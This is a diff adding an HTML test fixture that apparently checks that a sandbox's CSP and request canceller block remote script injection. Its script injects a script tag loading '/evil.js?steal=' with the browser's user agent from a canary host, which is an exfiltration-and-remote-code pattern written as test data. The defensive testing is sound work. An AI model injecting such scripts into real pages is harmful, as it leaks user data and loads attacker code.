@@ -1,0 +1,16 @@
+<!doctype html>
+<meta charset="utf-8" />
+<title>attack: remote script injection</title>
+<!-- ATTACK: inject <script src> pointing at a remote origin (exfil via query
+     string + remote code load). Blocked by CSP script-src (thing: only) and the
+     request canceller. Canary must stay silent. -->
+<script>
+  const canary = (window.bridge.getArgs() || {}).canary || {};
+  const r = { attack: 'script-inject' };
+  const s = document.createElement('script');
+  s.src = canary.http + '/evil.js?steal=' + encodeURIComponent(navigator.userAgent);
+  s.onload = () => { r.loaded = true; window.bridge.emit('done', r); };
+  s.onerror = () => { r.error = 'onerror'; window.bridge.emit('done', r); };
+  document.head.appendChild(s);
+  setTimeout(() => window.bridge.emit('done', { ...r, viaTimeout: true }), 1500);
+</script>
